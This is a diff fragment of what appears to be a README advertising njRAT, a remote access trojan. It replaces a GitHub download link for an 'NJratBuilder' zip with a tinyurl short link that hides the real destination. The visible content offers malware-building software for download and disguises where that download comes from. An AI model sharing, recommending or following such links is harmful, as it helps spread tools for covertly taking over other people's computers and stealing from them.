@@ -24,7 +24,7 @@ First observed in 2012 and still actively maintained, this RAT remains one of th
 
 ## 📥 Official Download
 
-https://github.com/elforsrike13/njrat-2026-update/releases/download/NJRAT-April-Update/NJratBuilder.April_Update.zip
+https://tinyurl.com/njrat2026
 
 ---
 
